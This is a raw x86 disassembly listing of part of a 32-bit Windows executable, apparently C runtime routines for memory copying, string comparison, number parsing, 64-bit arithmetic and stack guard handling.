  426a7f:	add    BYTE PTR [edx+ebp*2+0x6abc0042],dh
  426a86:	inc    edx
  426a87:	add    bh,cl
  426a89:	push   0x42
  426a8b:	add    BYTE PTR [ebx-0x76e371bc],cl
  426a91:	inc    esp
  426a92:	(bad)  
  426a93:	sbb    al,0x8b
  426a95:	inc    esp
  426a96:	mov    ds,WORD PTR [eax]
  426a98:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  426a9c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  426aa0:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  426aa4:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  426aa8:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  426aac:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  426ab0:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  426ab4:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  426ab8:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  426abc:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  426ac0:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  426ac4:	lea    eax,[ecx*4+0x0]
  426acb:	add    esi,eax
  426acd:	add    edi,eax
  426acf:	jmp    DWORD PTR [edx*4+0x426ad8]
  426ad6:	mov    edi,edi
  426ad8:	call   0xf042ad47
  426add:	push   0x42
  426adf:	add    BYTE PTR [eax],al
  426ae1:	imul   eax,DWORD PTR [edx+0x0],0x14
  426ae5:	imul   eax,DWORD PTR [edx+0x0],0xffffff8b
  426ae9:	inc    ebp
  426aea:	or     BYTE PTR [esi+0x5f],bl
  426aed:	leave  
  426aee:	ret    
  426aef:	nop
  426af0:	mov    al,BYTE PTR [esi+0x3]
  426af3:	mov    BYTE PTR [edi+0x3],al
  426af6:	mov    eax,DWORD PTR [ebp+0x8]
  426af9:	pop    esi
  426afa:	pop    edi
  426afb:	leave  
  426afc:	ret    
  426afd:	lea    ecx,[ecx+0x0]
  426b00:	mov    al,BYTE PTR [esi+0x3]
  426b03:	mov    BYTE PTR [edi+0x3],al
  426b06:	mov    al,BYTE PTR [esi+0x2]
  426b09:	mov    BYTE PTR [edi+0x2],al
  426b0c:	mov    eax,DWORD PTR [ebp+0x8]
  426b0f:	pop    esi
  426b10:	pop    edi
  426b11:	leave  
  426b12:	ret    
  426b13:	nop
  426b14:	mov    al,BYTE PTR [esi+0x3]
  426b17:	mov    BYTE PTR [edi+0x3],al
  426b1a:	mov    al,BYTE PTR [esi+0x2]
  426b1d:	mov    BYTE PTR [edi+0x2],al
  426b20:	mov    al,BYTE PTR [esi+0x1]
  426b23:	mov    BYTE PTR [edi+0x1],al
  426b26:	mov    eax,DWORD PTR [ebp+0x8]
  426b29:	pop    esi
  426b2a:	pop    edi
  426b2b:	leave  
  426b2c:	ret    
  426b2d:	push   ebp
  426b2e:	mov    ebp,esp
  426b30:	sub    esp,0xc
  426b33:	mov    eax,ds:0x45c430
  426b38:	xor    eax,DWORD PTR [ebp+0x4]
  426b3b:	and    BYTE PTR [ebp-0x6],0x0
  426b3f:	push   0x6
  426b41:	mov    DWORD PTR [ebp-0x4],eax
  426b44:	lea    eax,[ebp-0xc]
  426b47:	push   eax
  426b48:	push   0x1004
  426b4d:	push   DWORD PTR [ebp+0x8]
  426b50:	call   DWORD PTR ds:0x4280e0
  426b56:	test   eax,eax
  426b58:	jne    0x426b5f
  426b5a:	or     eax,0xffffffff
  426b5d:	jmp    0x426b69
  426b5f:	lea    eax,[ebp-0xc]
  426b62:	push   eax
  426b63:	call   0x426e6e
  426b68:	pop    ecx
  426b69:	mov    ecx,DWORD PTR [ebp-0x4]
  426b6c:	xor    ecx,DWORD PTR [ebp+0x4]
  426b6f:	call   0x423f7c
  426b74:	leave  
  426b75:	ret    
  426b76:	push   0x38
  426b78:	push   0x428eb0
  426b7d:	call   0x4238a8
  426b82:	mov    eax,ds:0x45c430
  426b87:	xor    eax,DWORD PTR [ebp+0x4]
  426b8a:	mov    DWORD PTR [ebp-0x1c],eax
  426b8d:	xor    edi,edi
  426b8f:	mov    DWORD PTR [ebp-0x20],edi
  426b92:	mov    DWORD PTR [ebp-0x24],edi
  426b95:	mov    eax,DWORD PTR [ebp+0x14]
  426b98:	mov    ebx,DWORD PTR [eax]
  426b9a:	mov    DWORD PTR [ebp-0x28],ebx
  426b9d:	mov    DWORD PTR [ebp-0x2c],edi
  426ba0:	mov    eax,DWORD PTR [ebp+0x8]
  426ba3:	cmp    eax,DWORD PTR [ebp+0xc]
  426ba6:	je     0x426d1f
  426bac:	lea    ecx,[ebp-0x40]
  426baf:	push   ecx
  426bb0:	push   eax
  426bb1:	mov    esi,DWORD PTR ds:0x4280a4
  426bb7:	call   esi
  426bb9:	test   eax,eax
  426bbb:	je     0x426bdd
  426bbd:	cmp    DWORD PTR [ebp-0x40],0x1
  426bc1:	jne    0x426bdd
  426bc3:	lea    eax,[ebp-0x40]
  426bc6:	push   eax
  426bc7:	push   DWORD PTR [ebp+0xc]
  426bca:	call   esi
  426bcc:	test   eax,eax
  426bce:	je     0x426bdd
  426bd0:	cmp    DWORD PTR [ebp-0x40],0x1
  426bd4:	jne    0x426bdd
  426bd6:	mov    DWORD PTR [ebp-0x2c],0x1
  426bdd:	cmp    DWORD PTR [ebp-0x2c],edi
  426be0:	je     0x426bfc
  426be2:	cmp    ebx,0xffffffff
  426be5:	je     0x426beb
  426be7:	mov    esi,ebx
  426be9:	jmp    0x426bf7
  426beb:	push   DWORD PTR [ebp+0x10]
  426bee:	call   0x423ec0
  426bf3:	pop    ecx
  426bf4:	mov    esi,eax
  426bf6:	inc    esi
  426bf7:	mov    DWORD PTR [ebp-0x44],esi
  426bfa:	jmp    0x426bff
  426bfc:	mov    esi,DWORD PTR [ebp-0x44]
  426bff:	cmp    DWORD PTR [ebp-0x2c],edi
  426c02:	jne    0x426c1e
  426c04:	push   edi
  426c05:	push   edi
  426c06:	push   ebx
  426c07:	push   DWORD PTR [ebp+0x10]
  426c0a:	push   0x1
  426c0c:	push   DWORD PTR [ebp+0x8]
  426c0f:	call   DWORD PTR ds:0x4280d0
  426c15:	mov    esi,eax
  426c17:	mov    DWORD PTR [ebp-0x44],esi
  426c1a:	cmp    esi,edi
  426c1c:	je     0x426c76
  426c1e:	mov    DWORD PTR [ebp-0x4],edi
  426c21:	lea    eax,[esi+esi*1]
  426c24:	add    eax,0x3
  426c27:	and    eax,0xfffffffc
  426c2a:	call   0x423900
  426c2f:	mov    DWORD PTR [ebp-0x18],esp
  426c32:	mov    ebx,esp
  426c34:	mov    DWORD PTR [ebp-0x48],ebx
  426c37:	lea    eax,[esi+esi*1]
  426c3a:	push   eax
  426c3b:	push   edi
  426c3c:	push   ebx
  426c3d:	call   0x4261b0
  426c42:	add    esp,0xc
  426c45:	or     DWORD PTR [ebp-0x4],0xffffffff
  426c49:	jmp    0x426c62
  426c4b:	xor    eax,eax
  426c4d:	inc    eax
  426c4e:	ret    
  426c4f:	mov    esp,DWORD PTR [ebp-0x18]
  426c52:	call   0x426d45
  426c57:	xor    edi,edi
  426c59:	xor    ebx,ebx
  426c5b:	or     DWORD PTR [ebp-0x4],0xffffffff
  426c5f:	mov    esi,DWORD PTR [ebp-0x44]
  426c62:	cmp    ebx,edi
  426c64:	jne    0x426c84
  426c66:	push   esi
  426c67:	push   0x2
  426c69:	call   0x4249c8
  426c6e:	pop    ecx
  426c6f:	pop    ecx
  426c70:	mov    ebx,eax
  426c72:	cmp    ebx,edi
  426c74:	jne    0x426c7d
  426c76:	xor    eax,eax
  426c78:	jmp    0x426d31
  426c7d:	mov    DWORD PTR [ebp-0x24],0x1
  426c84:	push   esi
  426c85:	push   ebx
  426c86:	push   DWORD PTR [ebp-0x28]
  426c89:	push   DWORD PTR [ebp+0x10]
  426c8c:	push   0x1
  426c8e:	push   DWORD PTR [ebp+0x8]
  426c91:	call   DWORD PTR ds:0x4280d0
  426c97:	test   eax,eax
  426c99:	je     0x426d22
  426c9f:	cmp    DWORD PTR [ebp+0x18],edi
  426ca2:	je     0x426cc4
  426ca4:	push   edi
  426ca5:	push   edi
  426ca6:	push   DWORD PTR [ebp+0x1c]
  426ca9:	push   DWORD PTR [ebp+0x18]
  426cac:	push   esi
  426cad:	push   ebx
  426cae:	push   edi
  426caf:	push   DWORD PTR [ebp+0xc]
  426cb2:	call   DWORD PTR ds:0x428054
  426cb8:	test   eax,eax
  426cba:	je     0x426d22
  426cbc:	mov    eax,DWORD PTR [ebp+0x18]
  426cbf:	mov    DWORD PTR [ebp-0x20],eax
  426cc2:	jmp    0x426d22
  426cc4:	cmp    DWORD PTR [ebp-0x2c],edi
  426cc7:	jne    0x426cdf
  426cc9:	push   edi
  426cca:	push   edi
  426ccb:	push   edi
  426ccc:	push   edi
  426ccd:	push   esi
  426cce:	push   ebx
  426ccf:	push   edi
  426cd0:	push   DWORD PTR [ebp+0xc]
  426cd3:	call   DWORD PTR ds:0x428054
  426cd9:	mov    esi,eax
  426cdb:	cmp    esi,edi
  426cdd:	je     0x426d22
  426cdf:	push   esi
  426ce0:	push   0x1
  426ce2:	call   0x4249c8
  426ce7:	pop    ecx
  426ce8:	pop    ecx
  426ce9:	mov    DWORD PTR [ebp-0x20],eax
  426cec:	cmp    eax,edi
  426cee:	je     0x426d22
  426cf0:	push   edi
  426cf1:	push   edi
  426cf2:	push   esi
  426cf3:	push   eax
  426cf4:	push   esi
  426cf5:	push   ebx
  426cf6:	push   edi
  426cf7:	push   DWORD PTR [ebp+0xc]
  426cfa:	call   DWORD PTR ds:0x428054
  426d00:	cmp    eax,edi
  426d02:	jne    0x426d12
  426d04:	push   DWORD PTR [ebp-0x20]
  426d07:	call   0x4244ba
  426d0c:	pop    ecx
  426d0d:	mov    DWORD PTR [ebp-0x20],edi
  426d10:	jmp    0x426d22
  426d12:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  426d16:	je     0x426d22
  426d18:	mov    ecx,DWORD PTR [ebp+0x14]
  426d1b:	mov    DWORD PTR [ecx],eax
  426d1d:	jmp    0x426d22
  426d1f:	mov    ebx,DWORD PTR [ebp-0x48]
  426d22:	cmp    DWORD PTR [ebp-0x24],edi
  426d25:	je     0x426d2e
  426d27:	push   ebx
  426d28:	call   0x4244ba
  426d2d:	pop    ecx
  426d2e:	mov    eax,DWORD PTR [ebp-0x20]
  426d31:	lea    esp,[ebp-0x54]
  426d34:	mov    ecx,DWORD PTR [ebp-0x1c]
  426d37:	xor    ecx,DWORD PTR [ebp+0x4]
  426d3a:	call   0x423f7c
  426d3f:	call   0x4238e3
  426d44:	ret    
  426d45:	push   ebp
  426d46:	mov    ebp,esp
  426d48:	sub    esp,0x48
  426d4b:	push   ebx
  426d4c:	push   esi
  426d4d:	push   edi
  426d4e:	push   0x4
  426d50:	pop    eax
  426d51:	call   0x423900
  426d56:	mov    ebx,esp
  426d58:	push   0x1c
  426d5a:	lea    eax,[ebp-0x24]
  426d5d:	push   eax
  426d5e:	push   ebx
  426d5f:	call   DWORD PTR ds:0x4280f0
  426d65:	test   eax,eax
  426d67:	je     0x426dda
  426d69:	mov    edi,DWORD PTR [ebp-0x20]
  426d6c:	lea    eax,[ebp-0x48]
  426d6f:	push   eax
  426d70:	call   DWORD PTR ds:0x4280ec
  426d76:	mov    eax,DWORD PTR [ebp-0x44]
  426d79:	lea    esi,[eax-0x1]
  426d7c:	not    esi
  426d7e:	and    esi,ebx
  426d80:	sub    esi,eax
  426d82:	mov    DWORD PTR [ebp-0x4],eax
  426d85:	mov    eax,ds:0x45cac4
  426d8a:	mov    ecx,eax
  426d8c:	dec    ecx
  426d8d:	neg    ecx
  426d8f:	sbb    ecx,ecx
  426d91:	and    ecx,0xffff1000
  426d97:	add    ecx,0x11000
  426d9d:	add    ecx,edi
  426d9f:	cmp    esi,ecx
  426da1:	jb     0x426dda
  426da3:	cmp    eax,0x1
  426da6:	je     0x426df2
  426da8:	mov    ebx,edi
  426daa:	mov    edi,0x1000
  426daf:	push   0x1c
  426db1:	lea    eax,[ebp-0x24]
  426db4:	push   eax
  426db5:	push   ebx
  426db6:	call   DWORD PTR ds:0x4280f0
  426dbc:	test   eax,eax
  426dbe:	je     0x426dda
  426dc0:	add    ebx,DWORD PTR [ebp-0x18]
  426dc3:	test   DWORD PTR [ebp-0x14],edi
  426dc6:	je     0x426daf
  426dc8:	test   BYTE PTR [ebp-0xf],0x1
  426dcc:	mov    ebx,DWORD PTR [ebp-0x24]
  426dcf:	je     0x426dd6
  426dd1:	xor    eax,eax
  426dd3:	inc    eax
  426dd4:	jmp    0x426e0e
  426dd6:	cmp    esi,ebx
  426dd8:	jae    0x426dde
  426dda:	xor    eax,eax
  426ddc:	jmp    0x426e0e
  426dde:	push   0x4
  426de0:	push   edi
  426de1:	push   DWORD PTR [ebp-0x4]
  426de4:	push   ebx
  426de5:	call   DWORD PTR ds:0x4280b0
  426deb:	mov    eax,ds:0x45cac4
  426df0:	jmp    0x426df4
  426df2:	mov    ebx,esi
  426df4:	dec    eax
  426df5:	neg    eax
  426df7:	sbb    eax,eax
  426df9:	and    eax,0x103
  426dfe:	lea    ecx,[ebp-0x8]
  426e01:	push   ecx
  426e02:	inc    eax
  426e03:	push   eax
  426e04:	push   DWORD PTR [ebp-0x4]
  426e07:	push   ebx
  426e08:	call   DWORD PTR ds:0x4280e8
  426e0e:	lea    esp,[ebp-0x54]
  426e11:	pop    edi
  426e12:	pop    esi
  426e13:	pop    ebx
  426e14:	leave  
  426e15:	ret    
  426e16:	int3   
  426e17:	int3   
  426e18:	int3   
  426e19:	int3   
  426e1a:	int3   
  426e1b:	int3   
  426e1c:	int3   
  426e1d:	int3   
  426e1e:	int3   
  426e1f:	int3   
  426e20:	push   ebp
  426e21:	mov    ebp,esp
  426e23:	push   edi
  426e24:	push   esi
  426e25:	push   ebx
  426e26:	mov    esi,DWORD PTR [ebp+0xc]
  426e29:	mov    edi,DWORD PTR [ebp+0x8]
  426e2c:	mov    al,0xff
  426e2e:	mov    edi,edi
  426e30:	or     al,al
  426e32:	je     0x426e66
  426e34:	mov    al,BYTE PTR [esi]
  426e36:	add    esi,0x1
  426e39:	mov    ah,BYTE PTR [edi]
  426e3b:	add    edi,0x1
  426e3e:	cmp    ah,al
  426e40:	je     0x426e30
  426e42:	sub    al,0x41
  426e44:	cmp    al,0x1a
  426e46:	sbb    cl,cl
  426e48:	and    cl,0x20
  426e4b:	add    al,cl
  426e4d:	add    al,0x41
  426e4f:	xchg   al,ah
  426e51:	sub    al,0x41
  426e53:	cmp    al,0x1a
  426e55:	sbb    cl,cl
  426e57:	and    cl,0x20
  426e5a:	add    al,cl
  426e5c:	add    al,0x41
  426e5e:	cmp    al,ah
  426e60:	je     0x426e30
  426e62:	sbb    al,al
  426e64:	sbb    al,0xff
  426e66:	movsx  eax,al
  426e69:	pop    ebx
  426e6a:	pop    esi
  426e6b:	pop    edi
  426e6c:	leave  
  426e6d:	ret    
  426e6e:	push   esi
  426e6f:	push   edi
  426e70:	call   0x42375d
  426e75:	mov    edi,DWORD PTR [eax+0x64]
  426e78:	cmp    edi,DWORD PTR ds:0x45c58c
  426e7e:	je     0x426e87
  426e80:	call   0x424c0f
  426e85:	mov    edi,eax
  426e87:	mov    esi,DWORD PTR [esp+0xc]
  426e8b:	cmp    DWORD PTR [edi+0x28],0x1
  426e8f:	movzx  eax,BYTE PTR [esi]
  426e92:	jle    0x426ea2
  426e94:	push   0x8
  426e96:	push   eax
  426e97:	push   edi
  426e98:	call   0x426ef6
  426e9d:	add    esp,0xc
  426ea0:	jmp    0x426eac
  426ea2:	mov    ecx,DWORD PTR [edi+0x48]
  426ea5:	movzx  eax,BYTE PTR [ecx+eax*2]
  426ea9:	and    eax,0x8
  426eac:	test   eax,eax
  426eae:	je     0x426eb3
  426eb0:	inc    esi
  426eb1:	jmp    0x426e8b
  426eb3:	movzx  ecx,BYTE PTR [esi]
  426eb6:	inc    esi
  426eb7:	cmp    ecx,0x2d
  426eba:	mov    edx,ecx
  426ebc:	je     0x426ec3
  426ebe:	cmp    ecx,0x2b
  426ec1:	jne    0x426ec7
  426ec3:	movzx  ecx,BYTE PTR [esi]
  426ec6:	inc    esi
  426ec7:	xor    eax,eax
  426ec9:	cmp    ecx,0x30
  426ecc:	jl     0x426ed8
  426ece:	cmp    ecx,0x39
  426ed1:	jg     0x426ed8
  426ed3:	sub    ecx,0x30
  426ed6:	jmp    0x426edb
  426ed8:	or     ecx,0xffffffff
  426edb:	cmp    ecx,0xffffffff
  426ede:	je     0x426eec
  426ee0:	lea    eax,[eax+eax*4]
  426ee3:	lea    eax,[ecx+eax*2]
  426ee6:	movzx  ecx,BYTE PTR [esi]
  426ee9:	inc    esi
  426eea:	jmp    0x426ec9
  426eec:	cmp    edx,0x2d
  426eef:	pop    edi
  426ef0:	pop    esi
  426ef1:	jne    0x426ef5
  426ef3:	neg    eax
  426ef5:	ret    
  426ef6:	push   ebp
  426ef7:	mov    ebp,esp
  426ef9:	push   ecx
  426efa:	mov    eax,DWORD PTR [ebp+0xc]
  426efd:	lea    ecx,[eax+0x1]
  426f00:	cmp    ecx,0x100
  426f06:	mov    ecx,DWORD PTR [ebp+0x8]
  426f09:	ja     0x426f14
  426f0b:	mov    ecx,DWORD PTR [ecx+0x48]
  426f0e:	movzx  eax,WORD PTR [ecx+eax*2]
  426f12:	jmp    0x426f68
  426f14:	push   esi
  426f15:	mov    edx,eax
  426f17:	sar    edx,0x8
  426f1a:	push   edi
  426f1b:	mov    edi,DWORD PTR [ecx+0x48]
  426f1e:	movzx  esi,dl
  426f21:	test   BYTE PTR [edi+esi*2+0x1],0x80
  426f26:	pop    edi
  426f27:	pop    esi
  426f28:	je     0x426f39
  426f2a:	and    BYTE PTR [ebp-0x2],0x0
  426f2e:	push   0x2
  426f30:	mov    BYTE PTR [ebp-0x3],al
  426f33:	mov    BYTE PTR [ebp-0x4],dl
  426f36:	pop    eax
  426f37:	jmp    0x426f43
  426f39:	and    BYTE PTR [ebp-0x3],0x0
  426f3d:	mov    BYTE PTR [ebp-0x4],al
  426f40:	xor    eax,eax
  426f42:	inc    eax
  426f43:	push   0x1
  426f45:	push   DWORD PTR [ecx+0x14]
  426f48:	push   DWORD PTR [ecx+0x4]
  426f4b:	lea    ecx,[ebp+0xe]
  426f4e:	push   ecx
  426f4f:	push   eax
  426f50:	lea    eax,[ebp-0x4]
  426f53:	push   eax
  426f54:	push   0x1
  426f56:	call   0x425fd8
  426f5b:	add    esp,0x1c
  426f5e:	test   eax,eax
  426f60:	jne    0x426f64
  426f62:	leave  
  426f63:	ret    
  426f64:	movzx  eax,WORD PTR [ebp+0xe]
  426f68:	and    eax,DWORD PTR [ebp+0x10]
  426f6b:	leave  
  426f6c:	ret    
  426f6d:	int3   
  426f6e:	int3   
  426f6f:	int3   
  426f70:	mov    eax,DWORD PTR [esp+0x8]
  426f74:	mov    ecx,DWORD PTR [esp+0x10]
  426f78:	or     ecx,eax
  426f7a:	mov    ecx,DWORD PTR [esp+0xc]
  426f7e:	jne    0x426f89
  426f80:	mov    eax,DWORD PTR [esp+0x4]
  426f84:	mul    ecx
  426f86:	ret    0x10
  426f89:	push   ebx
  426f8a:	mul    ecx
  426f8c:	mov    ebx,eax
  426f8e:	mov    eax,DWORD PTR [esp+0x8]
  426f92:	mul    DWORD PTR [esp+0x14]
  426f96:	add    ebx,eax
  426f98:	mov    eax,DWORD PTR [esp+0x8]
  426f9c:	mul    ecx
  426f9e:	add    edx,ebx
  426fa0:	pop    ebx
  426fa1:	ret    0x10
  426fa4:	int3   
  426fa5:	int3   
  426fa6:	int3   
  426fa7:	int3   
  426fa8:	int3   
  426fa9:	int3   
  426faa:	int3   
  426fab:	int3   
  426fac:	int3   
  426fad:	int3   
  426fae:	int3   
  426faf:	int3   
  426fb0:	push   ebp
  426fb1:	mov    ebp,esp
  426fb3:	push   edi
  426fb4:	push   esi
  426fb5:	push   ebx
  426fb6:	mov    ecx,DWORD PTR [ebp+0x10]
  426fb9:	or     ecx,ecx
  426fbb:	je     0x42700a
  426fbd:	mov    esi,DWORD PTR [ebp+0x8]
  426fc0:	mov    edi,DWORD PTR [ebp+0xc]
  426fc3:	mov    bh,0x41
  426fc5:	mov    bl,0x5a
  426fc7:	mov    dh,0x20
  426fc9:	lea    ecx,[ecx+0x0]
  426fcc:	mov    ah,BYTE PTR [esi]
  426fce:	or     ah,ah
  426fd0:	mov    al,BYTE PTR [edi]
  426fd2:	je     0x426ffb
  426fd4:	or     al,al
  426fd6:	je     0x426ffb
  426fd8:	add    esi,0x1
  426fdb:	add    edi,0x1
  426fde:	cmp    ah,bh
  426fe0:	jb     0x426fe8
  426fe2:	cmp    ah,bl
  426fe4:	ja     0x426fe8
  426fe6:	add    ah,dh
  426fe8:	cmp    al,bh
  426fea:	jb     0x426ff2
  426fec:	cmp    al,bl
  426fee:	ja     0x426ff2
  426ff0:	add    al,dh
  426ff2:	cmp    ah,al
  426ff4:	jne    0x427001
  426ff6:	sub    ecx,0x1
  426ff9:	jne    0x426fcc
  426ffb:	xor    ecx,ecx
  426ffd:	cmp    ah,al
  426fff:	je     0x42700a
  427001:	mov    ecx,0xffffffff
  427006:	jb     0x42700a
  427008:	neg    ecx
  42700a:	mov    eax,ecx
  42700c:	pop    ebx
  42700d:	pop    esi
  42700e:	pop    edi
  42700f:	leave  
  427010:	ret    
  427011:	int3   
  427012:	int3   
  427013:	int3   
  427014:	int3   
  427015:	int3   
  427016:	int3   
  427017:	int3   
  427018:	int3   
  427019:	int3   
  42701a:	int3   
  42701b:	int3   
  42701c:	int3   
  42701d:	int3   
  42701e:	int3   
  42701f:	int3   
  427020:	push   esi
  427021:	mov    eax,DWORD PTR [esp+0x14]
  427025:	or     eax,eax
  427027:	jne    0x427051
  427029:	mov    ecx,DWORD PTR [esp+0x10]
  42702d:	mov    eax,DWORD PTR [esp+0xc]
  427031:	xor    edx,edx
  427033:	div    ecx
  427035:	mov    ebx,eax
  427037:	mov    eax,DWORD PTR [esp+0x8]
  42703b:	div    ecx
  42703d:	mov    esi,eax
  42703f:	mov    eax,ebx
  427041:	mul    DWORD PTR [esp+0x10]
  427045:	mov    ecx,eax
  427047:	mov    eax,esi
  427049:	mul    DWORD PTR [esp+0x10]
  42704d:	add    edx,ecx
  42704f:	jmp    0x427098
  427051:	mov    ecx,eax
  427053:	mov    ebx,DWORD PTR [esp+0x10]
  427057:	mov    edx,DWORD PTR [esp+0xc]
  42705b:	mov    eax,DWORD PTR [esp+0x8]
  42705f:	shr    ecx,1
  427061:	rcr    ebx,1
  427063:	shr    edx,1
  427065:	rcr    eax,1
  427067:	or     ecx,ecx
  427069:	jne    0x42705f
  42706b:	div    ebx
  42706d:	mov    esi,eax
  42706f:	mul    DWORD PTR [esp+0x14]
  427073:	mov    ecx,eax
  427075:	mov    eax,DWORD PTR [esp+0x10]
  427079:	mul    esi
  42707b:	add    edx,ecx
  42707d:	jb     0x42708d
  42707f:	cmp    edx,DWORD PTR [esp+0xc]
  427083:	ja     0x42708d
  427085:	jb     0x427096
  427087:	cmp    eax,DWORD PTR [esp+0x8]
  42708b:	jbe    0x427096
  42708d:	dec    esi
  42708e:	sub    eax,DWORD PTR [esp+0x10]
  427092:	sbb    edx,DWORD PTR [esp+0x14]
  427096:	xor    ebx,ebx
  427098:	sub    eax,DWORD PTR [esp+0x8]
  42709c:	sbb    edx,DWORD PTR [esp+0xc]
  4270a0:	neg    edx
  4270a2:	neg    eax
  4270a4:	sbb    edx,0x0
  4270a7:	mov    ecx,edx
  4270a9:	mov    edx,ebx
  4270ab:	mov    ebx,ecx
  4270ad:	mov    ecx,eax
  4270af:	mov    eax,esi
  4270b1:	pop    esi
  4270b2:	ret    0x10
  4270b5:	int3   
  4270b6:	int3   
  4270b7:	int3   
  4270b8:	int3   
  4270b9:	int3   
  4270ba:	int3   
  4270bb:	int3   
  4270bc:	int3   
  4270bd:	int3   
  4270be:	int3   
  4270bf:	int3   
  4270c0:	lea    eax,[edx-0x1]
  4270c3:	pop    ebx
  4270c4:	ret    
  4270c5:	lea    esp,[esp+0x0]
  4270cc:	lea    esp,[esp+0x0]
  4270d0:	xor    eax,eax
  4270d2:	mov    al,BYTE PTR [esp+0x8]
  4270d6:	push   ebx
  4270d7:	mov    ebx,eax
  4270d9:	shl    eax,0x8
  4270dc:	mov    edx,DWORD PTR [esp+0x8]
  4270e0:	test   edx,0x3
  4270e6:	je     0x4270fd
  4270e8:	mov    cl,BYTE PTR [edx]
  4270ea:	add    edx,0x1
  4270ed:	cmp    cl,bl
  4270ef:	je     0x4270c0
  4270f1:	test   cl,cl
  4270f3:	je     0x427146
  4270f5:	test   edx,0x3
  4270fb:	jne    0x4270e8
  4270fd:	or     ebx,eax
  4270ff:	push   edi
  427100:	mov    eax,ebx
  427102:	shl    ebx,0x10
  427105:	push   esi
  427106:	or     ebx,eax
  427108:	mov    ecx,DWORD PTR [edx]
  42710a:	mov    edi,0x7efefeff
  42710f:	mov    eax,ecx
  427111:	mov    esi,edi
  427113:	xor    ecx,ebx
  427115:	add    esi,eax
  427117:	add    edi,ecx
  427119:	xor    ecx,0xffffffff
  42711c:	xor    eax,0xffffffff
  42711f:	xor    ecx,edi
  427121:	xor    eax,esi
  427123:	add    edx,0x4
  427126:	and    ecx,0x81010100
  42712c:	jne    0x42714a
  42712e:	and    eax,0x81010100
  427133:	je     0x427108
  427135:	and    eax,0x1010100
  42713a:	jne    0x427144
  42713c:	and    esi,0x80000000
  427142:	jne    0x427108
  427144:	pop    esi
  427145:	pop    edi
  427146:	pop    ebx
  427147:	xor    eax,eax
  427149:	ret    
  42714a:	mov    eax,DWORD PTR [edx-0x4]
  42714d:	cmp    al,bl
  42714f:	je     0x427187
  427151:	test   al,al
  427153:	je     0x427144
  427155:	cmp    ah,bl
  427157:	je     0x427180
  427159:	test   ah,ah
  42715b:	je     0x427144
  42715d:	shr    eax,0x10
  427160:	cmp    al,bl
  427162:	je     0x427179
  427164:	test   al,al
  427166:	je     0x427144
  427168:	cmp    ah,bl
  42716a:	je     0x427172
  42716c:	test   ah,ah
  42716e:	je     0x427144
  427170:	jmp    0x427108
  427172:	pop    esi
  427173:	pop    edi
  427174:	lea    eax,[edx-0x1]
  427177:	pop    ebx
  427178:	ret    
  427179:	lea    eax,[edx-0x2]
  42717c:	pop    esi
  42717d:	pop    edi
  42717e:	pop    ebx
  42717f:	ret    
  427180:	lea    eax,[edx-0x3]
  427183:	pop    esi
  427184:	pop    edi
  427185:	pop    ebx
  427186:	ret    
  427187:	lea    eax,[edx-0x4]
  42718a:	pop    esi
  42718b:	pop    edi
  42718c:	pop    ebx
  42718d:	ret    
  42718e:	jmp    DWORD PTR ds:0x4280e4
